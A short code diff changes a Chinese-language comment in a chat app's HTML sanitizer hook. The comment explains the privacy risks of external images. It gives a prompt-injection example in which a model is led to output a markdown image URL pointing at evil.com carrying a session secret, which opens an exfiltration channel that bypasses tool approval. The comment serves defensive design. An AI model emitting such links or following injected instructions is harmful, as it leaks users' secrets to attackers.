@@ -78,8 +78,7 @@ purify?.addHook("uponSanitizeElement", (node, data) => {
  * 每个外链图都会向第三方发一次请求，把「这条消息被打开了」以及用户的 IP/UA
  * 交出去；最阴的一条是提示注入——让模型输出
  * `![](https://evil.com/?x=<会话里的秘密>)` 就有了一个不经过工具审批的外传通道
- * （`docs/audit-summary.md`「7.4 明确不改」记的正是这个取舍，用户 2026-09-17 拍板：
- * 为了「回答里的外链图能显示」保留 `img-src https:`）。
+ * （见 docs/audit-summary.md「明确不改」：为显示外链图保留 img-src https:，仍有外传面）。
  *
  * 因此这里做三件不牺牲显示能力的事：
  * - `referrerpolicy="no-referrer"`：不带来源信息；
